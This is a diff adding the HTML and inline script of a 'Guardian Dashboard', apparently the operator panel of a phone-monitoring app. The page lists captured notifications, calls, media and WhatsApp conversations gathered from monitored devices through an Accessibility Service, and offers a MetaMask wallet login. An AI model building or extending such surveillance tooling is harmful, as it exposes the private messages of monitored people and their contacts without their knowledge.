@@ -1,0 +1,577 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Guardian Dashboard</title>
+    <script type="module" crossorigin src="/assets/index-Xe8jKuP5.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-CMcrw2BA.css">
+    <style>
+      #guardian-source-filter {
+        background: #1e293b;
+        color: #e2e8f0;
+        border: 1px solid #334155;
+        border-radius: 6px;
+        padding: 4px 10px;
+        font-size: 12px;
+        cursor: pointer;
+        outline: none;
+        margin-right: 6px;
+        height: 30px;
+      }
+      #guardian-source-filter:focus { border-color: #3b82f6; }
+      #guardian-source-filter option { background: #1e293b; color: #e2e8f0; }
+
+      /* WhatsApp panel */
+      #wa-panel {
+        display: none;
+        flex-direction: column;
+        flex: 1;
+        min-height: 0;
+        overflow: hidden;
+      }
+      #wa-tab.active { color: #22c55e !important; border-bottom-color: #22c55e !important; }
+      .wa-toolbar {
+        padding: 10px 16px;
+        background: #1e293b;
+        border-bottom: 1px solid #334155;
+        display: flex;
+        gap: 8px;
+        align-items: center;
+        flex-shrink: 0;
+        flex-wrap: wrap;
+      }
+      .wa-toolbar input, .wa-toolbar select {
+        background: #0f172a;
+        border: 1px solid #334155;
+        border-radius: 6px;
+        padding: 6px 10px;
+        color: #e2e8f0;
+        font-size: 12px;
+        outline: none;
+        min-width: 0;
+      }
+      .wa-toolbar input { flex: 1; min-width: 120px; }
+      .wa-toolbar input:focus, .wa-toolbar select:focus { border-color: #3b82f6; }
+      .wa-toolbar select option { background: #0f172a; }
+      .wa-ticker { font-size: 11px; color: #475569; margin-left: auto; white-space: nowrap; }
+      #wa-msgs { flex: 1; overflow-y: auto; padding: 16px; }
+      .wa-msg {
+        background: #1e293b;
+        border: 1px solid #334155;
+        border-radius: 8px;
+        padding: 10px 14px;
+        margin-bottom: 8px;
+      }
+      .wa-msg-head {
+        display: flex;
+        align-items: baseline;
+        gap: 8px;
+        margin-bottom: 4px;
+        flex-wrap: wrap;
+      }
+      .wa-chat { font-size: 12px; font-weight: 600; color: #22c55e; }
+      .wa-who { font-size: 12px; color: #94a3b8; }
+      .wa-out .wa-who { color: #60a5fa; }
+      .wa-time { font-size: 11px; color: #475569; margin-left: auto; }
+      .wa-body { font-size: 14px; color: #e2e8f0; line-height: 1.5; word-break: break-word; }
+      .wa-hint { color: #475569; font-size: 13px; padding: 40px 16px; text-align: center; line-height: 1.8; }
+    </style>
+  </head>
+  <body>
+    <div id="root"></div>
+    <script>
+(function () {
+  "use strict";
+
+  // ── Intercept fetch to track active deviceId ─────────────────────────────────
+  // ── Intercept fetch: track active deviceId + paginate media ─────────────────
+  var activeDeviceId = null;
+  var _mediaPag = { page: 1, totalPages: 1, total: 0, limit: 50, deviceId: null, filters: '' };
+  var _origFetch = window.fetch;
+  window.fetch = function (url, opts) {
+    if (typeof url === "string") {
+      var _m = url.match(/\/api\/devices\/([^/?#]+)/);
+      if (_m) activeDeviceId = _m[1];
+      // Intercept media list calls — not /content /download /zip /screenshots
+      var _mm = url.match(/^\/api\/devices\/([^/?#]+)\/media(\?[^#]*)?$/);
+      if (_mm) {
+        var _did = _mm[1], _qs = _mm[2] ? _mm[2].slice(1) : '';
+        var _p = new URLSearchParams(_qs);
+        // Fingerprint of filter params (exclude page/limit — those are ours)
+        var _fk = Array.from(_p.entries())
+          .filter(function(e) { return e[0] !== 'page' && e[0] !== 'limit'; })
+          .sort(function(a, b) { return a[0] < b[0] ? -1 : 1; })
+          .map(function(e) { return e[0] + '=' + e[1]; }).join('&');
+        // Reset to page 1 whenever device or filter changes
+        if (_did !== _mediaPag.deviceId || _fk !== _mediaPag.filters) {
+          _mediaPag.page = 1;
+          _mediaPag.deviceId = _did;
+          _mediaPag.filters = _fk;
+        }
+        _p.set('page', _mediaPag.page);
+        _p.set('limit', _mediaPag.limit);
+        var _nu = '/api/devices/' + _did + '/media?' + _p.toString();
+        return _origFetch(_nu, opts).then(function(resp) {
+          if (!resp.ok) return resp;
+          return resp.json().then(function(data) {
+            if (data && !Array.isArray(data) && Array.isArray(data.items)) {
+              _mediaPag.totalPages = Math.max(1, data.totalPages || 1);
+              _mediaPag.total = data.total || 0;
+              setTimeout(ensureMediaPag, 200);
+              return new Response(JSON.stringify(data.items), {
+                status: resp.status, statusText: resp.statusText,
+                headers: { 'Content-Type': 'application/json' }
+              });
+            }
+            // Fallback: return data as-is (shouldn't happen since ?page is always set)
+            return new Response(JSON.stringify(data), {
+              status: resp.status, statusText: resp.statusText,
+              headers: { 'Content-Type': 'application/json' }
+            });
+          }).catch(function() { return _origFetch(_nu, opts); });
+        });
+      }
+    }
+    return _origFetch.apply(this, arguments);
+  };
+
+  // ── Source filter dropdown ───────────────────────────────────────────────────
+  var SOURCES = [
+    { value: "all",               label: "All Sources",       match: function () { return true; } },
+    { value: "whatsapp",          label: "WhatsApp",          match: function (c) { return c === "WhatsApp"; } },
+    { value: "whatsapp_business", label: "WhatsApp Business", match: function (c) { return c === "WhatsApp Business"; } },
+    { value: "sms",               label: "SMS",               match: function (c) { return /^(messages?|messaging|samsung messages?|sms|mms|textra|signal)$/i.test(c); } },
+    { value: "calls",             label: "Calls",             match: function (c, t) { return /phone|dialer|call/i.test(c) && !/missed/i.test(t); } },
+    { value: "missed_calls",      label: "Missed Calls",      match: function (c, t) { return /phone|dialer|call/i.test(c) && /missed/i.test(t); } },
+    { value: "system_ui",         label: "System UI",         match: function (c) { return /^(system ui|android system|systemui)$/i.test(c); } },
+    { value: "android_auto",      label: "Android Auto",      match: function (c) { return /android auto/i.test(c); } },
+    { value: "google",            label: "Google",            match: function (c) { return /^(google|gmail|google search|google maps|maps|youtube|chrome|google keep|google photos|google play|google pay|google messages)$/i.test(c); } },
+    { value: "other",             label: "App Notifications", match: function (c) { return !/^(whatsapp|messages?|messaging|samsung messages?|sms|mms|phone|dialer|call|system ui|android system|android auto|google|gmail|google search|maps|youtube|chrome)$/i.test(c); } }
+  ];
+  var currentSource = "all";
+
+  function applySourceFilter() {
+    var ul = document.querySelector("ul.messages");
+    if (!ul) return;
+    var src = SOURCES.filter(function (s) { return s.value === currentSource; })[0] || SOURCES[0];
+    ul.querySelectorAll("li.msg").forEach(function (li) {
+      var chip = (li.querySelector(".app-chip") || {}).textContent || "";
+      var text = (li.querySelector(".msg-text") || {}).textContent || "";
+      li.style.display = src.match(chip.trim(), text.trim()) ? "" : "none";
+    });
+  }
+
+  function makeSourceDropdown() {
+    var sel = document.createElement("select");
+    sel.id = "guardian-source-filter";
+    sel.setAttribute("aria-label", "Filter by source");
+    SOURCES.forEach(function (s) {
+      var o = document.createElement("option");
+      o.value = s.value; o.textContent = s.label;
+      if (s.value === currentSource) o.selected = true;
+      sel.appendChild(o);
+    });
+    sel.onchange = function (e) { currentSource = e.target.value; applySourceFilter(); };
+    return sel;
+  }
+
+  // ── WhatsApp messages panel ──────────────────────────────────────────────────
+  var waConv = "", waSearch = "", waPollTimer = null, waActive = false;
+
+  function esc(s) {
+    return String(s || "").replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+  }
+  function fmtTime(ms) {
+    var n = Number(ms);
+    if (!n) return "";
+    var d = new Date(n);
+    return isNaN(d) ? "" : d.toLocaleString(undefined, {month:"short",day:"numeric",hour:"2-digit",minute:"2-digit"});
+  }
+
+  function buildWaPanel() {
+    var wrap = document.createElement("div");
+    wrap.id = "wa-panel";
+
+    var tb = document.createElement("div");
+    tb.className = "wa-toolbar";
+
+    var inp = document.createElement("input");
+    inp.id = "wa-search-inp"; inp.type = "text"; inp.placeholder = "Search messages…";
+    inp.oninput = function () { waSearch = inp.value; clearTimeout(waPollTimer); waPollTimer = setTimeout(refreshWa, 300); };
+
+    var sel = document.createElement("select");
+    sel.id = "wa-conv-sel";
+    sel.innerHTML = '<option value="">All conversations</option>';
+    sel.onchange = function () { waConv = sel.value; refreshWa(); };
+
+    var tick = document.createElement("span");
+    tick.className = "wa-ticker"; tick.id = "wa-tick"; tick.textContent = "auto-refresh 10s";
+
+    tb.appendChild(inp); tb.appendChild(sel); tb.appendChild(tick);
+
+    var msgs = document.createElement("div");
+    msgs.id = "wa-msgs";
+    msgs.innerHTML = '<div class="wa-hint">Select a device from the sidebar to view captured WhatsApp messages.</div>';
+
+    wrap.appendChild(tb); wrap.appendChild(msgs);
+    return wrap;
+  }
+
+  function refreshWa() {
+    var did = activeDeviceId;
+    if (!did) {
+      var el = document.getElementById("wa-msgs");
+      if (el) el.innerHTML = '<div class="wa-hint">Select a device from the sidebar, then click <strong>WhatsApp</strong> again.</div>';
+      return;
+    }
+    var parts = [];
+    if (waSearch.trim()) parts.push("q=" + encodeURIComponent(waSearch.trim()));
+    if (waConv) parts.push("chat=" + encodeURIComponent(waConv));
+    var url = "/api/devices/" + did + "/chats" + (parts.length ? "?" + parts.join("&") : "");
+    var el = document.getElementById("wa-msgs");
+
+    _origFetch(url, { credentials: "include" }).then(function (r) {
+      if (r.status === 401 || r.status === 403) { window.location.href = "/"; return null; }
+      return r.ok ? r.json() : null;
+    }).then(function (msgs) {
+      if (!msgs || !el) return;
+      var tick = document.getElementById("wa-tick");
+      if (tick) tick.textContent = msgs.length + " msg" + (msgs.length !== 1 ? "s" : "") + " • " + new Date().toLocaleTimeString(undefined, {hour:"2-digit",minute:"2-digit",second:"2-digit"});
+      if (!msgs.length) {
+        el.innerHTML = '<div class="wa-hint">No WhatsApp messages captured yet.<br>Make sure Accessibility Service is enabled and open a WhatsApp chat on the device.</div>';
+        return;
+      }
+      el.innerHTML = msgs.map(function (m) {
+        var out = m.sender === "Me";
+        return '<div class="wa-msg' + (out ? " wa-out" : "") + '">' +
+          '<div class="wa-msg-head">' +
+          '<span class="wa-chat">' + esc(m.chatName || "Unknown") + '</span>' +
+          '<span class="wa-who">' + esc(out ? "You" : (m.sender || "")) + '</span>' +
+          '<span class="wa-time">' + fmtTime(m.messageAt) + '</span></div>' +
+          '<div class="wa-body">' + esc(m.text || "") + '</div></div>';
+      }).join("");
+    }).catch(function () {});
+
+    // Refresh conversations list
+    _origFetch("/api/devices/" + did + "/chats/conversations", { credentials: "include" })
+      .then(function (r) { return r.ok ? r.json() : null; })
+      .then(function (convs) {
+        if (!convs) return;
+        var s = document.getElementById("wa-conv-sel");
+        if (!s) return;
+        var cur = s.value;
+        s.innerHTML = '<option value="">All conversations (' + convs.reduce(function (a, c) { return a + c.count; }, 0) + ')</option>';
+        convs.forEach(function (c) {
+          var o = document.createElement("option");
+          o.value = c.chatName || "";
+          o.textContent = esc(c.chatName || "Unknown") + " (" + c.count + ")";
+          if (c.chatName === cur) o.selected = true;
+          s.appendChild(o);
+        });
+      }).catch(function () {});
+  }
+
+  function startWaPoll() {
+    stopWaPoll();
+    refreshWa();
+    waPollTimer = setInterval(refreshWa, 10000);
+  }
+  function stopWaPoll() {
+    if (waPollTimer) { clearInterval(waPollTimer); waPollTimer = null; }
+  }
+
+  function showWaPanel() {
+    waActive = true;
+    var panel = document.getElementById("wa-panel");
+    if (!panel) return;
+    // Hide all React-rendered content in .feed except .tabs and #wa-panel
+    var feed = panel.parentElement;
+    if (feed) {
+      Array.prototype.forEach.call(feed.children, function (ch) {
+        if (ch.id !== "wa-panel" && !ch.classList.contains("tabs")) {
+          ch.style.display = "none";
+          ch._waHidden = true;
+        }
+      });
+    }
+    panel.style.display = "flex";
+    startWaPoll();
+  }
+
+  function hideWaPanel() {
+    waActive = false;
+    stopWaPoll();
+    var panel = document.getElementById("wa-panel");
+    if (!panel) return;
+    panel.style.display = "none";
+    var feed = panel.parentElement;
+    if (feed) {
+      Array.prototype.forEach.call(feed.children, function (ch) {
+        if (ch._waHidden) { ch.style.display = ""; ch._waHidden = false; }
+      });
+    }
+  }
+
+
+  // ── MetaMask wallet login ─────────────────────────────────────────────────────
+  var mmInjected = false;
+
+  function ensureMetaMaskBtn() {
+    var pwInput = document.querySelector('input[type="password"]');
+    if (!pwInput) { mmInjected = false; return; }          // not on login page
+    if (mmInjected || document.getElementById('mm-login-btn')) return;
+
+    var form = pwInput.closest('form') || pwInput.parentElement;
+    if (!form) return;
+    mmInjected = true;
+
+    var divider = document.createElement('div');
+    divider.style.cssText = 'display:flex;align-items:center;gap:12px;margin:16px 0;';
+    divider.innerHTML = '<hr style="flex:1;border:none;border-top:1px solid #334155"><span style="font-size:12px;color:#64748b;white-space:nowrap">or sign in with wallet</span><hr style="flex:1;border:none;border-top:1px solid #334155">';
+
+    var btn = document.createElement('button');
+    btn.id = 'mm-login-btn';
+    btn.type = 'button';
+    btn.style.cssText = 'width:100%;padding:10px 16px;background:#f6851b;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:4px;';
+    btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 35 33" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M32.9582 1L19.8241 10.7183L22.2665 4.99099L32.9582 1Z" fill="#E17726" stroke="#E17726" stroke-width=".25" stroke-linecap="round" stroke-linejoin="round"/><path d="M2.0582 1L15.0707 10.809L12.7503 4.99098L2.0582 1Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M28.2295 23.5335L24.7452 28.872L32.2173 30.9295L34.3674 23.6501L28.2295 23.5335Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M0.649414 23.6501L2.78292 30.9295L10.2549 28.872L6.78733 23.5335L0.649414 23.6501Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M9.85261 14.5149L7.7749 17.6507L15.1804 17.9917L14.9298 10.0745L9.85261 14.5149Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M25.1476 14.5149L20.003 9.98297L19.8241 17.9917L27.2254 17.6507L25.1476 14.5149Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M10.2549 28.872L14.7296 26.6978L10.8684 23.7002L10.2549 28.872Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/><path d="M20.2705 26.6978L24.7452 28.872L24.1317 23.7002L20.2705 26.6978Z" fill="#E27625" stroke="#E27625" stroke-width=".25"/></svg> Connect MetaMask Wallet';
+    btn.onmouseenter = function() { this.style.background = '#d97706'; };
+    btn.onmouseleave = function() { this.style.background = '#f6851b'; };
+    btn.onclick = function() { connectMetaMask(btn); };
+
+    var statusEl = document.createElement('div');
+    statusEl.id = 'mm-status';
+    statusEl.style.cssText = 'font-size:12px;text-align:center;min-height:18px;color:#94a3b8;padding:4px 0;';
+
+    form.appendChild(divider);
+    form.appendChild(btn);
+    form.appendChild(statusEl);
+  }
+
+  function setMmStatus(msg, color) {
+    var el = document.getElementById('mm-status');
+    if (el) { el.textContent = msg; el.style.color = color || '#94a3b8'; }
+  }
+
+  async function connectMetaMask(btn) {
+    if (typeof window.ethereum === 'undefined') {
+      setMmStatus('MetaMask not detected. Please install the MetaMask extension.', '#ef4444');
+      return;
+    }
+    btn.disabled = true; btn.style.opacity = '0.7';
+    try {
+      setMmStatus('Requesting wallet access…', '#94a3b8');
+      var accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+      if (!accounts || !accounts[0]) throw new Error('No account selected');
+      var address = accounts[0];
+
+      setMmStatus('Fetching sign-in nonce…', '#94a3b8');
+      var nonceResp = await fetch('/api/wallet/nonce?address=' + encodeURIComponent(address), { credentials: 'include' });
+      var nonceData = await nonceResp.json();
+      if (!nonceResp.ok) throw new Error(nonceData.error || 'Wallet not authorized');
+
+      setMmStatus('Please sign the message in MetaMask…', '#94a3b8');
+      var signature = await window.ethereum.request({
+        method: 'personal_sign',
+        params: [nonceData.message, address]
+      });
+
+      setMmStatus('Verifying signature…', '#94a3b8');
+      var verifyResp = await fetch('/api/wallet/verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ address: address, signature: signature })
+      });
+      var verifyData = await verifyResp.json();
+      if (!verifyResp.ok) throw new Error(verifyData.error || 'Verification failed');
+
+      setMmStatus('Authenticated! Loading dashboard…', '#22c55e');
+      setTimeout(function() { window.location.reload(); }, 600);
+    } catch (err) {
+      var msg = (err && err.code === 4001) ? 'Signature request was rejected.' : (err && err.message) || 'MetaMask login failed';
+      setMmStatus(msg, '#ef4444');
+      btn.disabled = false; btn.style.opacity = '1';
+    }
+  }
+
+
+  // ── Media section pagination ──────────────────────────────────────────────────
+  var _mediaPagBusy = false;          // prevents MO re-entrancy during DOM rebuild
+  var _mediaPagLastKey = '';          // skip render when state hasn't changed
+
+  function ensureMediaPag() {
+    if (_mediaPagBusy) return;        // guard: MO fired while we're rebuilding
+    var grid = document.querySelector('ul.media-grid');
+    if (!grid) return;
+    var panel = grid.closest ? grid.closest('.media-panel') : null;
+    if (!panel) panel = grid.parentElement;
+    if (!panel) return;
+    var wrap = document.getElementById('_mpag');
+    if (!wrap) {
+      wrap = document.createElement('div');
+      wrap.id = '_mpag';
+      wrap.style.cssText = 'display:flex;align-items:center;justify-content:center;gap:6px;padding:16px;flex-wrap:wrap;border-top:1px solid #334155;margin-top:8px;';
+      _mediaPagBusy = true;
+      panel.appendChild(wrap);
+      _mediaPagBusy = false;
+    }
+    // Skip full re-render if pagination state hasn't changed
+    var key = _mediaPag.page + '|' + _mediaPag.totalPages + '|' + _mediaPag.total;
+    if (key === _mediaPagLastKey && wrap.hasChildNodes()) return;
+    _mediaPagLastKey = key;
+    _mediaPagBusy = true;
+    _renderMpag(wrap);
+    _mediaPagBusy = false;
+  }
+
+  function _renderMpag(wrap) {
+    var total = _mediaPag.totalPages, cur = _mediaPag.page;
+    if (total <= 1) { wrap.style.display = 'none'; wrap.innerHTML = ''; return; }
+    wrap.style.display = 'flex';
+    wrap.innerHTML = '';
+
+    function _mb(txt, dis, fn) {
+      var b = document.createElement('button');
+      b.textContent = txt; b.disabled = dis;
+      b.style.cssText = 'padding:5px 11px;background:#1e293b;color:' +
+        (dis ? '#475569' : '#cbd5e1') +
+        ';border:1px solid #334155;border-radius:6px;font-size:13px;cursor:' +
+        (dis ? 'not-allowed' : 'pointer') + ';';
+      if (!dis) {
+        b.addEventListener('mouseenter', function() { this.style.background = '#334155'; });
+        b.addEventListener('mouseleave', function() { this.style.background = '#1e293b'; });
+        b.onclick = fn;
+      }
+      return b;
+    }
+
+    wrap.appendChild(_mb('← Prev', cur <= 1, function() { _goMpag(cur - 1); }));
+
+    _mpagNums(cur, total).forEach(function(p) {
+      if (p === '...') {
+        var sp = document.createElement('span');
+        sp.textContent = '…'; sp.style.cssText = 'color:#475569;padding:0 4px;';
+        wrap.appendChild(sp);
+      } else {
+        var btn = _mb(String(p), false, (function(pg) { return function() { _goMpag(pg); }; })(p));
+        if (p === cur) {
+          btn.style.background = '#3b82f6';
+          btn.style.color = '#fff';
+          btn.style.borderColor = '#3b82f6';
+          btn.addEventListener('mouseenter', function() { this.style.background = '#2563eb'; });
+          btn.addEventListener('mouseleave', function() { this.style.background = '#3b82f6'; });
+        }
+        wrap.appendChild(btn);
+      }
+    });
+
+    wrap.appendChild(_mb('Next →', cur >= total, function() { _goMpag(cur + 1); }));
+
+    if (_mediaPag.total > 0) {
+      var info = document.createElement('span');
+      info.style.cssText = 'font-size:12px;color:#64748b;margin-left:8px;white-space:nowrap;';
+      var s1 = (cur - 1) * _mediaPag.limit + 1;
+      var s2 = Math.min(cur * _mediaPag.limit, _mediaPag.total);
+      info.textContent = s1 + '–' + s2 + ' of ' + _mediaPag.total;
+      wrap.appendChild(info);
+    }
+  }
+
+  function _mpagNums(cur, total) {
+    if (total <= 7) {
+      var arr = []; for (var i = 1; i <= total; i++) arr.push(i); return arr;
+    }
+    var pages = [1];
+    if (cur > 3) pages.push('...');
+    var lo = Math.max(2, cur - 1), hi = Math.min(total - 1, cur + 1);
+    for (var i = lo; i <= hi; i++) pages.push(i);
+    if (cur < total - 2) pages.push('...');
+    pages.push(total);
+    return pages;
+  }
+
+  function _goMpag(page) {
+    if (page < 1 || page > _mediaPag.totalPages) return;
+    _mediaPag.page = page;
+    _mediaPagLastKey = '';  // force re-render on next ensureMediaPag call
+    // Force React to re-fetch: switch away from Media tab then back
+    var tabs = document.querySelectorAll('.tab:not(#wa-tab)');
+    var mediaTab = null, otherTab = null;
+    tabs.forEach(function(t) {
+      var txt = t.textContent.trim();
+      if (txt === 'Media') mediaTab = t;
+      else if (!otherTab && !t.classList.contains('active')) otherTab = t;
+    });
+    if (!otherTab) tabs.forEach(function(t) { if (t !== mediaTab && !otherTab) otherTab = t; });
+    if (mediaTab && otherTab) {
+      otherTab.click();
+      setTimeout(function() { if (mediaTab) mediaTab.click(); }, 50);
+    } else if (mediaTab) {
+      mediaTab.click();
+    }
+  }
+
+  // ── Observers ────────────────────────────────────────────────────────────────
+  var lastBar = null, lastUl = null;
+
+  function ensureWaTab() {
+    var tabs = document.querySelector(".tabs");
+    if (!tabs) return;
+    if (tabs.querySelector("#wa-tab")) return; // already there
+
+    var btn = document.createElement("button");
+    btn.id = "wa-tab"; btn.className = "tab"; btn.textContent = "WhatsApp";
+    btn.onclick = function () {
+      if (waActive) {
+        hideWaPanel();
+        btn.classList.remove("active");
+        var firstTab = tabs.querySelector(".tab:not(#wa-tab)");
+        if (firstTab) firstTab.click();
+      } else {
+        tabs.querySelectorAll(".tab:not(#wa-tab)").forEach(function (t) { t.classList.remove("active"); });
+        btn.classList.add("active");
+        showWaPanel();
+      }
+    };
+    tabs.appendChild(btn);
+
+    tabs.querySelectorAll(".tab:not(#wa-tab)").forEach(function (t) {
+      t.addEventListener("click", function () {
+        if (waActive) { hideWaPanel(); var wb = document.getElementById("wa-tab"); if (wb) wb.classList.remove("active"); }
+      });
+    });
+  }
+
+  function ensureWaPanel() {
+    var feed = document.querySelector(".feed");
+    if (!feed) return;
+    if (document.getElementById("wa-panel")) return; // already there
+    feed.appendChild(buildWaPanel());
+  }
+
+  var mo = new MutationObserver(function () {
+    // Source filter — re-inject if bar is replaced or filter removed
+    var bar = document.querySelector(".msg-filter-bar");
+    if (bar !== lastBar) { lastBar = bar; }
+    if (bar && !bar.querySelector("#guardian-source-filter")) bar.insertBefore(makeSourceDropdown(), bar.firstChild);
+
+    // List filter
+    var ul = document.querySelector("ul.messages");
+    if (ul !== lastUl) { lastUl = ul; if (currentSource !== "all") applySourceFilter(); }
+
+    // WhatsApp tab — always ensure it exists (React re-renders remove it)
+    ensureWaTab();
+
+    // WhatsApp panel — always ensure it exists in feed
+    ensureWaPanel();
+    ensureMetaMaskBtn();
+    ensureMediaPag();
+  });
+
+  mo.observe(document.documentElement, { childList: true, subtree: true });
+})();
+    </script>
+  </body>
+</html>
+
